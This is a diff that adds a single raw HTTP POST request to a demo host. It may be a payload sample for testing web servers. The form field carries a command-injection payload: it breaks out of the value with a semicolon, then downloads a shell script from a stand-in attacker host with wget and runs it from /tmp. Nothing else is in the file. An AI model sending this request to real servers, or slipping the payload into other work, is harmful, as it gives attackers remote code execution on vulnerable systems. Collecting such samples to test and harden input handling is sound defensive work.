@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+Connection: close
+
+data=; /*x*/wget http://evil.tld/s.sh -O /tmp/s.sh; sh /tmp/s.sh
